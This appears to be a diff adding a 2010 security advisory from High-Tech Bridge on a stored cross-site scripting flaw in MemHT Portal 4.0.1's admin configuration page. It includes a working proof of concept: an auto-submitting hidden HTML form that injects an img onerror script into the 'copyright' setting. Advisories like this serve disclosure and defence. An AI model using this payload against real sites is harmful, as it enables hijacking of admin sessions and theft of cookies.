@@ -1,0 +1,57 @@
+Vulnerability ID: HTB22662
+Reference: http://www.htbridge.ch/advisory/xss_vulnerability_in_memht_portal.html
+Product: MemHT Portal
+Vendor: Miltenovik Manojlo ( http://www.memht.com/ ) 
+Vulnerable Version: 4.0.1 and probably prior versions
+Vendor Notification: 19 October 2010 
+Vulnerability Type: Stored XSS (Cross Site Scripting)
+Status: Not Fixed, Vendor Alerted
+Risk level: Medium 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "admin/pages/configuration/index.php" script to properly sanitize user-supplied input in "copyright" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/admin.php?page=configuration&op=siteConfig&ok=true" method="post" name="main">
+
+<input type="hidden" name="nome_sito" value="sitename">
+<input type="hidden" name="site_url" value="http://host">
+<input type="hidden" name="webmaster_mail" value="email@host.com">
+<input type="hidden" name="site_open" value="1">
+<input type="hidden" name="offlinemsg" value="">
+<input type="hidden" name="defpage" value="news">
+<input type="hidden" name="timestamp" value="%d/%m/%Y %H:%i">
+<input type="hidden" name="timezone" value="0">
+<input type="hidden" name="admin_ghosts" value="1">
+<input type="hidden" name="infobar" value="0">
+<input type="hidden" name="graphic_check" value="1">
+<input type="hidden" name="textarea_editor" value="1">
+<input type="hidden" name="modrewrite" value="0">
+<input type="hidden" name="footmsg" value="">
+<input type="hidden" name="copyright" value="copyright<img src=x onerror=alert(12345)>">
+<input type="hidden" name="descrizione" value="">
+<input type="hidden" name="metatags" value="">
+<input type="hidden" name="user_max_lunghezza" value="20">
+<input type="hidden" name="pass_max_lunghezza" value="20">
+<input type="hidden" name="user_confirm_email" value="1">
+<input type="hidden" name="approve_users" value="0">
+<input type="hidden" name="num_news_home" value="5">
+<input type="hidden" name="num_news_page" value="20">
+<input type="hidden" name="guest_msgbox" value="0">
+<input type="hidden" name="forumattachment" value="0">
+<input type="hidden" name="forumattachmentfolder" value="attachment">
+<input type="hidden" name="virtualpages" value="1">
+<input type="hidden" name="usecomments" value="1">
+<input type="hidden" name="guest_com" value="0">
+<input type="hidden" name="Submit" value="Save">
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+
